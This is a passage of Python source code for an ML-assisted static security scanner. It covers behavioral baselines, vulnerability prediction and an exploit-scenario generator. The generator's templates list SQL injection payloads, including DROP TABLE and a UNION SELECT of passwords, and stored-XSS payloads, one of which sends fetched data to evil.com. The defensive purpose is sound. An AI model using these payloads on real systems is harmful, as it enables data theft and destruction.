    def analyze_behavior(self, file_path: str, features: CodeFeatures) -> List[BehavioralAnomaly]:
        """Analyze code behavior and detect anomalies."""
        anomalies = []
        
        try:
            # Extract behavioral patterns
            behavior_profile = self._extract_behavior_profile(features)
            
            # Compare with baseline
            baseline = self._get_baseline(file_path)
            
            if baseline:
                # Detect anomalies
                detected_anomalies = self._detect_behavioral_anomalies(
                    behavior_profile, baseline, file_path
                )
                anomalies.extend(detected_anomalies)
            
            # Update baseline with new observations
            self._update_baseline(file_path, behavior_profile)
            
            return anomalies
            
        except Exception as e:
            self.logger.error(f"Error in behavioral analysis: {e}")
            return anomalies
    
    def _extract_behavior_profile(self, features: CodeFeatures) -> Dict[str, Any]:
        """Extract behavioral profile from code features."""
        profile = {
            'complexity_distribution': features.complexity_metrics,
            'function_patterns': self._analyze_function_patterns(features.function_signatures),
            'security_patterns': {
                'dangerous_functions_ratio': len(features.dangerous_functions) / max(1, len(features.function_signatures)),
                'sanitization_ratio': len(features.sanitization_functions) / max(1, len(features.input_sources)),
                'error_handling_coverage': len(features.error_handling_patterns) / max(1, len(features.function_signatures))
            },
            'framework_usage': features.framework_indicators,
            'library_diversity': len(set(features.library_dependencies)),
            'control_flow_complexity': sum(features.control_flow_features.values()),
            'data_flow_complexity': sum(features.data_flow_features.values())
        }
        
        return profile
    
    def _analyze_function_patterns(self, function_signatures: List[str]) -> Dict[str, Any]:
        """Analyze patterns in function signatures."""
        if not function_signatures:
            return {}
        
        # Extract patterns
        patterns = {
            'avg_params': 0,
            'naming_patterns': [],
            'complexity_indicators': []
        }
        
        total_params = 0
        for sig in function_signatures:
            # Extract parameter count from signature
            if '(' in sig and ')' in sig:
                param_part = sig.split('(')[1].split(')')[0]
                param_count = int(param_part) if param_part.isdigit() else 0
                total_params += param_count
            
            # Extract function name patterns
            func_name = sig.split('(')[0]
            patterns['naming_patterns'].append(func_name)
        
        patterns['avg_params'] = total_params / len(function_signatures)
        
        return patterns
    
    def _get_baseline(self, file_path: str) -> Optional[Dict[str, Any]]:
        """Get behavioral baseline for a file."""
        return self.behavioral_baselines.get(file_path)
    
    def _detect_behavioral_anomalies(self, current_profile: Dict[str, Any],
                                   baseline: Dict[str, Any],
                                   file_path: str) -> List[BehavioralAnomaly]:
        """Detect behavioral anomalies by comparing with baseline."""
        anomalies = []
        
        try:
            # Check complexity anomalies
            complexity_anomalies = self._check_complexity_anomalies(
                current_profile, baseline, file_path
            )
            anomalies.extend(complexity_anomalies)
            
            # Check security pattern anomalies
            security_anomalies = self._check_security_anomalies(
                current_profile, baseline, file_path
            )
            anomalies.extend(security_anomalies)
            
            # Check structural anomalies
            structural_anomalies = self._check_structural_anomalies(
                current_profile, baseline, file_path
            )
            anomalies.extend(structural_anomalies)
            
            return anomalies
            
        except Exception as e:
            self.logger.error(f"Error detecting behavioral anomalies: {e}")
            return anomalies
    
    def _check_complexity_anomalies(self, current: Dict[str, Any],
                                  baseline: Dict[str, Any],
                                  file_path: str) -> List[BehavioralAnomaly]:
        """Check for complexity-related anomalies."""
        anomalies = []
        
        current_complexity = current.get('complexity_distribution', {})
        baseline_complexity = baseline.get('complexity_distribution', {})
        
        for metric, current_value in current_complexity.items():
            baseline_value = baseline_complexity.get(metric, current_value)
            
            if baseline_value > 0:
                deviation = abs(current_value - baseline_value) / baseline_value
                
                if deviation > self.anomaly_threshold:
                    anomaly = BehavioralAnomaly(
                        anomaly_id=f"complexity_{metric}_{hash(file_path)}",
                        anomaly_type="complexity_deviation",
                        description=f"Unusual {metric} complexity: {current_value:.2f} vs baseline {baseline_value:.2f}",
                        severity=SeverityLevel.MEDIUM if deviation > 1.0 else SeverityLevel.LOW,
                        confidence=min(deviation, 1.0),
                        file_path=file_path,
                        line_range=(1, 100),  # Placeholder
                        function_context=None,
                        baseline_behavior={'complexity': baseline_value},
                        observed_behavior={'complexity': current_value},
                        deviation_score=deviation,
                        similar_patterns=[],
                        historical_context={},
                        threat_indicators=['complexity_spike']
                    )
                    anomalies.append(anomaly)
        
        return anomalies
    
    def _check_security_anomalies(self, current: Dict[str, Any],
                                baseline: Dict[str, Any],
                                file_path: str) -> List[BehavioralAnomaly]:
        """Check for security-related anomalies."""
        anomalies = []
        
        current_security = current.get('security_patterns', {})
        baseline_security = baseline.get('security_patterns', {})
        
        # Check dangerous functions ratio
        current_dangerous = current_security.get('dangerous_functions_ratio', 0)
        baseline_dangerous = baseline_security.get('dangerous_functions_ratio', 0)
        
        if current_dangerous > baseline_dangerous * 2 and current_dangerous > 0.1:
            anomaly = BehavioralAnomaly(
                anomaly_id=f"security_dangerous_{hash(file_path)}",
                anomaly_type="security_degradation",
                description=f"Significant increase in dangerous function usage: {current_dangerous:.2f} vs {baseline_dangerous:.2f}",
                severity=SeverityLevel.HIGH,
                confidence=0.8,
                file_path=file_path,
                line_range=(1, 100),
                function_context=None,
                baseline_behavior={'dangerous_ratio': baseline_dangerous},
                observed_behavior={'dangerous_ratio': current_dangerous},
                deviation_score=current_dangerous / max(baseline_dangerous, 0.01),
                similar_patterns=[],
                historical_context={},
                threat_indicators=['dangerous_function_increase', 'security_degradation']
            )
            anomalies.append(anomaly)
        
        return anomalies
    
    def _check_structural_anomalies(self, current: Dict[str, Any],
                                  baseline: Dict[str, Any],
                                  file_path: str) -> List[BehavioralAnomaly]:
        """Check for structural anomalies."""
        anomalies = []
        
        # Check control flow complexity
        current_cf = current.get('control_flow_complexity', 0)
        baseline_cf = baseline.get('control_flow_complexity', 0)
        
        if baseline_cf > 0:
            cf_deviation = abs(current_cf - baseline_cf) / baseline_cf
            
            if cf_deviation > self.anomaly_threshold and current_cf > baseline_cf * 1.5:
                anomaly = BehavioralAnomaly(
                    anomaly_id=f"structural_cf_{hash(file_path)}",
                    anomaly_type="structural_change",
                    description=f"Unusual control flow complexity: {current_cf} vs baseline {baseline_cf}",
                    severity=SeverityLevel.MEDIUM,
                    confidence=min(cf_deviation, 1.0),
                    file_path=file_path,
                    line_range=(1, 100),
                    function_context=None,
                    baseline_behavior={'control_flow': baseline_cf},
                    observed_behavior={'control_flow': current_cf},
                    deviation_score=cf_deviation,
                    similar_patterns=[],
                    historical_context={},
                    threat_indicators=['complexity_increase']
                )
                anomalies.append(anomaly)
        
        return anomalies
    
    def _update_baseline(self, file_path: str, behavior_profile: Dict[str, Any]) -> None:
        """Update behavioral baseline with new observations."""
        try:
            if file_path not in self.behavioral_baselines:
                self.behavioral_baselines[file_path] = behavior_profile
            else:
                # Update baseline using exponential moving average
                baseline = self.behavioral_baselines[file_path]
                
                for key, value in behavior_profile.items():
                    if isinstance(value, (int, float)):
                        baseline[key] = (1 - self.learning_rate) * baseline.get(key, value) + self.learning_rate * value
                    elif isinstance(value, dict):
                        if key not in baseline:
                            baseline[key] = {}
                        for subkey, subvalue in value.items():
                            if isinstance(subvalue, (int, float)):
                                baseline[key][subkey] = (1 - self.learning_rate) * baseline[key].get(subkey, subvalue) + self.learning_rate * subvalue
            
            # Save updated baselines
            self._save_baselines()
            
        except Exception as e:
            self.logger.error(f"Error updating baseline: {e}")
    
    def _load_baselines(self) -> None:
        """Load behavioral baselines from file."""
        try:
            if os.path.exists(self.baseline_path):
                with open(self.baseline_path, 'r') as f:
                    self.behavioral_baselines = json.load(f)
                self.logger.info("Loaded behavioral baselines")
            else:
                self.behavioral_baselines = {}
                
        except Exception as e:
            self.logger.error(f"Error loading baselines: {e}")
            self.behavioral_baselines = {}
    
    def _save_baselines(self) -> None:
        """Save behavioral baselines to file."""
        try:
            os.makedirs(os.path.dirname(self.baseline_path), exist_ok=True)
            
            with open(self.baseline_path, 'w') as f:
                json.dump(self.behavioral_baselines, f, indent=2, default=str)
                
        except Exception as e:
            self.logger.error(f"Error saving baselines: {e}")


class AdvancedSASTEngine:
    """Advanced SAST engine with ML-based vulnerability detection."""
    
    def __init__(self, config: Config):
        self.config = config
        self.logger = logging.getLogger(__name__)
        
        # Initialize components
        self.feature_extractor = AdvancedFeatureExtractor(config)
        self.ml_predictor = MLVulnerabilityPredictor(config)
        self.behavioral_analyzer = BehavioralAnalyzer(config)
        
        # Initialize base SAST engine
        self.base_sast = SASTEngine(config)
        
        # Analysis configuration
        self.analysis_depth = AnalysisDepth(config.get('sast.analysis_depth', 'moderate'))
        self.enable_behavioral_analysis = config.get('sast.enable_behavioral_analysis', True)
        self.enable_ml_prediction = config.get('sast.enable_ml_prediction', True)
        
        # Performance tracking
        self.analysis_stats = {
            'files_analyzed': 0,
            'vulnerabilities_found': 0,
            'false_positives': 0,
            'analysis_time': 0.0
        }
    
    async def analyze_codebase(self, project_path: str) -> Dict[str, Any]:
        """Perform advanced SAST analysis on entire codebase."""
        start_time = datetime.now()
        
        try:
            self.logger.info(f"Starting advanced SAST analysis of {project_path}")
            
            # Discover source files
            source_files = self._discover_source_files(project_path)
            
            # Analyze files
            all_vulnerabilities = []
            all_anomalies = []
            
            for file_path in source_files:
                try:
                    # Analyze individual file
                    file_results = await self._analyze_file(file_path)
                    
                    all_vulnerabilities.extend(file_results['vulnerabilities'])
                    all_anomalies.extend(file_results['anomalies'])
                    
                    self.analysis_stats['files_analyzed'] += 1
                    
                except Exception as e:
                    self.logger.error(f"Error analyzing {file_path}: {e}")
                    continue
            
            # Generate comprehensive report
            analysis_time = (datetime.now() - start_time).total_seconds()
            self.analysis_stats['analysis_time'] = analysis_time
            self.analysis_stats['vulnerabilities_found'] = len(all_vulnerabilities)
            
            report = {
                'project_path': project_path,
                'analysis_timestamp': datetime.now(),
                'analysis_duration': analysis_time,
                'files_analyzed': len(source_files),
                'vulnerabilities': all_vulnerabilities,
                'behavioral_anomalies': all_anomalies,
                'statistics': self.analysis_stats,
                'recommendations': self._generate_recommendations(all_vulnerabilities, all_anomalies)
            }
            
            self.logger.info(f"Advanced SAST analysis complete. Found {len(all_vulnerabilities)} vulnerabilities and {len(all_anomalies)} anomalies")
            
            return report
            
        except Exception as e:
            self.logger.error(f"Error in advanced SAST analysis: {e}")
            raise
    
    async def _analyze_file(self, file_path: str) -> Dict[str, Any]:
        """Analyze a single file for vulnerabilities and anomalies."""
        vulnerabilities = []
        anomalies = []
        
        try:
            # Parse AST
            with open(file_path, 'r', encoding='utf-8') as f:
                source_code = f.read()
            
            ast_tree = ast.parse(source_code)
            
            # Extract features
            features = self.feature_extractor.extract_features(file_path, ast_tree)
            
            # Traditional SAST analysis
            traditional_vulns = await self._run_traditional_sast(file_path, ast_tree)
            vulnerabilities.extend(traditional_vulns)
            
            # ML-based prediction
            if self.enable_ml_prediction:
                ml_predictions = self.ml_predictor.predict_vulnerabilities(features)
                ml_vulns = self._convert_predictions_to_vulnerabilities(ml_predictions, file_path)
                vulnerabilities.extend(ml_vulns)
            
            # Behavioral analysis
            if self.enable_behavioral_analysis:
                behavioral_anomalies = self.behavioral_analyzer.analyze_behavior(file_path, features)
                anomalies.extend(behavioral_anomalies)
            
            return {
                'file_path': file_path,
                'vulnerabilities': vulnerabilities,
                'anomalies': anomalies,
                'features': features
            }
            
        except Exception as e:
            self.logger.error(f"Error analyzing file {file_path}: {e}")
            return {'file_path': file_path, 'vulnerabilities': [], 'anomalies': []}
    
    def _discover_source_files(self, project_path: str) -> List[str]:
        """Discover source code files in the project."""
        source_files = []
        
        # Supported file extensions
        extensions = {'.py', '.js', '.ts', '.java', '.cpp', '.c', '.cs', '.php', '.rb', '.go'}
        
        for root, dirs, files in os.walk(project_path):
            # Skip common directories
            dirs[:] = [d for d in dirs if d not in {'.git', '.venv', 'venv', 'node_modules', '__pycache__'}]
            
            for file in files:
                if any(file.endswith(ext) for ext in extensions):
                    source_files.append(os.path.join(root, file))
        
        return source_files
    
    async def _run_traditional_sast(self, file_path: str, ast_tree: ast.AST) -> List[SecurityVulnerability]:
        """Run traditional SAST analysis."""
        try:
            # Use base SAST engine
            return await self.base_sast.analyze_file(file_path)
        except Exception as e:
            self.logger.error(f"Error in traditional SAST: {e}")
            return []
    
    def _convert_predictions_to_vulnerabilities(self, predictions: List[VulnerabilityPrediction],
                                              file_path: str) -> List[SecurityVulnerability]:
        """Convert ML predictions to vulnerability objects."""
        vulnerabilities = []
        
        for pred in predictions:
            if pred.confidence_score > 0.5:  # Threshold for reporting
                vuln = SecurityVulnerability(
                    vulnerability_id=f"ml_{hash(file_path)}_{len(vulnerabilities)}",
                    vulnerability_type=pred.vulnerability_type,
                    severity=self._confidence_to_severity(pred.confidence_score),
                    confidence=self._confidence_to_level(pred.confidence_score),
                    title=f"ML-Detected {pred.vulnerability_type.value}",
                    description=pred.model_explanation,
                    file_path=file_path,
                    line_number=1,  # Placeholder - would need more sophisticated line detection
                    code_snippet="",  # Placeholder
                    data_flow_path=[],
                    cwe_id="",
                    owasp_category="",
                    compliance_violations=[],
                    remediation_suggestions=[
                        "Review the flagged code pattern",
                        "Consider implementing additional security controls",
                        "Validate input data thoroughly"
                    ],
                    false_positive_likelihood=pred.false_positive_probability,
                    exploit_complexity=pred.attack_complexity,
                    business_impact="",
                    technical_impact="",
                    affected_users="",
                    attack_scenarios=[],
                    detection_metadata={
                        'ml_model': pred.prediction_metadata.get('model_type', 'unknown'),
                        'confidence_score': pred.confidence_score,
                        'feature_importance': pred.feature_importance
                    }
                )
                
                vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _confidence_to_severity(self, confidence: float) -> SeverityLevel:
        """Convert confidence score to severity level."""
        if confidence >= 0.9:
            return SeverityLevel.CRITICAL
        elif confidence >= 0.7:
            return SeverityLevel.HIGH
        elif confidence >= 0.5:
            return SeverityLevel.MEDIUM
        else:
            return SeverityLevel.LOW
    
    def _confidence_to_level(self, confidence: float):
        """Convert confidence score to confidence level."""
        # Import ConfidenceLevel from sast_security if available
        if confidence >= 0.8:
            return "HIGH"
        elif confidence >= 0.6:
            return "MEDIUM"
        else:
            return "LOW"
    
    def _generate_recommendations(self, vulnerabilities: List[SecurityVulnerability],
                                anomalies: List[BehavioralAnomaly]) -> List[str]:
        """Generate security recommendations based on findings."""
        recommendations = []
        
        # Vulnerability-based recommendations
        vuln_types = [v.vulnerability_type for v in vulnerabilities]
        
        if any('injection' in str(vt).lower() for vt in vuln_types):
            recommendations.append("Implement input validation and parameterized queries")
        
        if any('xss' in str(vt).lower() for vt in vuln_types):
            recommendations.append("Use output encoding and Content Security Policy")
        
        if any('auth' in str(vt).lower() for vt in vuln_types):
            recommendations.append("Strengthen authentication and session management")
        
        # Anomaly-based recommendations
        if any(a.anomaly_type == 'complexity_deviation' for a in anomalies):
            recommendations.append("Review code complexity and consider refactoring")
        
        if any(a.anomaly_type == 'security_degradation' for a in anomalies):
            recommendations.append("Audit recent security-related code changes")
        
        # General recommendations
        if len(vulnerabilities) > 10:
            recommendations.append("Consider implementing automated security testing in CI/CD")
        
        if len(anomalies) > 5:
            recommendations.append("Establish coding standards and review processes")
        
        return recommendations


class ExploitGenerator:
    """Generate exploit scenarios for detected vulnerabilities."""
    
    def __init__(self, config: Config):
        self.config = config
        self.logger = logging.getLogger(__name__)
        
        # Exploit templates
        self.exploit_templates = self._load_exploit_templates()
    
    def generate_exploit_scenario(self, vulnerability: SecurityVulnerability) -> ExploitScenario:
        """Generate exploit scenario for a vulnerability."""
        try:
            vuln_type = vulnerability.vulnerability_type
            template = self.exploit_templates.get(vuln_type.value, {})
            
            scenario = ExploitScenario(
                scenario_id=f"exploit_{vulnerability.vulnerability_id}",
                vulnerability_id=vulnerability.vulnerability_id,
                attack_vector=template.get('attack_vector', 'Unknown'),
                exploit_steps=template.get('exploit_steps', []),
                payload_examples=template.get('payload_examples', []),
                attacker_capabilities=template.get('attacker_capabilities', []),
                prerequisites=template.get('prerequisites', []),
                target_environment={'file': vulnerability.file_path},
                potential_impact=template.get('potential_impact', []),
                affected_assets=['Application', 'Data'],
                business_consequences=template.get('business_consequences', []),
                detection_methods=template.get('detection_methods', []),
                prevention_measures=vulnerability.remediation_suggestions,
                response_actions=template.get('response_actions', [])
            )
            
            return scenario
            
        except Exception as e:
            self.logger.error(f"Error generating exploit scenario: {e}")
            return self._create_default_scenario(vulnerability)
    
    def _load_exploit_templates(self) -> Dict[str, Dict[str, Any]]:
        """Load exploit scenario templates."""
        return {
            'sql_injection': {
                'attack_vector': 'Web Application Input',
                'exploit_steps': [
                    'Identify input parameter',
                    'Test for SQL injection',
                    'Extract database schema',
                    'Dump sensitive data'
                ],
                'payload_examples': [
                    "' OR '1'='1",
                    "'; DROP TABLE users; --",
                    "' UNION SELECT username, password FROM users --"
                ],
                'attacker_capabilities': ['Basic SQL knowledge', 'Web browser'],
                'prerequisites': ['Accessible web application', 'Injectable parameter'],
                'potential_impact': ['Data breach', 'Data manipulation', 'System compromise'],
                'business_consequences': ['Financial loss', 'Reputation damage', 'Regulatory fines'],
                'detection_methods': ['WAF alerts', 'Database monitoring', 'Log analysis'],
                'response_actions': ['Block malicious IPs', 'Patch vulnerability', 'Audit database']
            },
            'xss_stored': {
                'attack_vector': 'Web Application Input',
                'exploit_steps': [
                    'Find input field that stores data',
                    'Inject malicious script',
                    'Wait for victim to view content',
                    'Execute payload in victim browser'
                ],
                'payload_examples': [
                    '<script>alert("XSS")</script>',
                    '<img src=x onerror=alert(document.cookie)>',
                    '<script>fetch("/api/data").then(r=>r.text()).then(d=>fetch("http://evil.com?data="+d))</script>'
                ],
                'attacker_capabilities': ['Basic HTML/JavaScript knowledge'],
                'prerequisites': ['User input storage', 'Lack of output encoding'],
                'potential_impact': ['Session hijacking', 'Data theft', 'Malware distribution'],
                'business_consequences': ['User compromise', 'Data breach', 'Trust loss'],
                'detection_methods': ['Content scanning', 'Browser security tools'],
                'response_actions': ['Sanitize stored data', 'Implement CSP', 'User notification']
            }
        }
    
    def _create_default_scenario(self, vulnerability: SecurityVulnerability) -> ExploitScenario:
        """Create default exploit scenario."""
        return ExploitScenario(
            scenario_id=f"default_{vulnerability.vulnerability_id}",
            vulnerability_id=vulnerability.vulnerability_id,
            attack_vector="Unknown",
            exploit_steps=["Analyze vulnerability", "Develop exploit", "Execute attack"],
            payload_examples=[],
            attacker_capabilities=["Technical knowledge"],
            prerequisites=["Access to vulnerable system"],
            target_environment={'file': vulnerability.file_path},
            potential_impact=["System compromise"],
            affected_assets=["Application"],
            business_consequences=["Security breach"],
            detection_methods=["Security monitoring"],
            prevention_measures=vulnerability.remediation_suggestions,
            response_actions=["Patch vulnerability", "Monitor for attacks"]
        )


# Export main classes
__all__ = [
    'AdvancedSASTEngine',
    'AdvancedFeatureExtractor',
    'MLVulnerabilityPredictor',
    'BehavioralAnalyzer',
    'ExploitGenerator',
    'CodeFeatures',
    'VulnerabilityPrediction',
    'BehavioralAnomaly',
    'ExploitScenario',
    'MLModelType',
    'AnalysisDepth',
    'ThreatLevel'
]